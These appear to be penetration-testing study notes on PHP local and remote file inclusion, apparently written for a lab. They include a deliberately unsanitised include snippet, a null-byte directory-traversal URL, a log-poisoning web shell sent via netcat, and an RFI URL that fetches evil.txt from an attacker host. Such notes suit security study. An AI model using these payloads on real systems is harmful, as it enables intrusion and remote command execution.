Web Application Attacks - File Inclusion

Info: 

Commonly found in poorly written PHP code. 
Depend on PHP versions and web server configurations - specifically php.ini values such as register_globals and allow_url wrappers.  

Hint: Cookies manager and Tamper Data are necessary for the examples below


Local File Inclusion (LFI)

In the Code below the LANG parameter is not sanitized:

if (isset( $_GET['LANG'] ) ) { $lang = $_GET['LANG'];} 
else { $lang = 'en';}
include( $lang . '.php' );

This code checks to see if parameter LAN is set. 
If it is set, then LANG is assigned to the variable $lang. 
If LANG is not set then the default value of 'en' is assigned. 
However, as no sanitisation is done on the parameter, anything could be set as the parameter value. 

Set Parameter LANG to output the C:\windows\system32\drivers\etc\hosts file. 

URL: website.com/index.php?LANG=../../../../../../../../../../windows/system32/drivers/etc/hosts%00
Note: The null byte is included as in the code file .php is appended to the end of the LANG paramter. The null byte tells the php engine to ignore everything after the null. 


Contaminating the Log Files (This writes to the apache log files located at c:\xampp\apache\logs\access.log)

Connect to victim using netcat: 

root@kali:~# nc -nv 10.11.1.35 80 
(UNKNOWN) [10.11.1.35] 80 (http) open
<?php echo shell_exec($_GET['cmd']);?>

URL: website.com/index.php?cmd=ipconfig&LANG=../../../../../../../../../../xampp/apache/logs/access/log%00



Remote File Inclusion (RFI)

Info: Force PHP webserver to try to include a remote file, located on the attacker's web server called evil.txt.
URL: website.com/index.php?LANG=http://10.11.0.117/evil.txt%00
Note: The null byte is included as in the code file .php is appended to the end of the LANG paramter. The null byte tells the php engine to ignore everything after the null. 
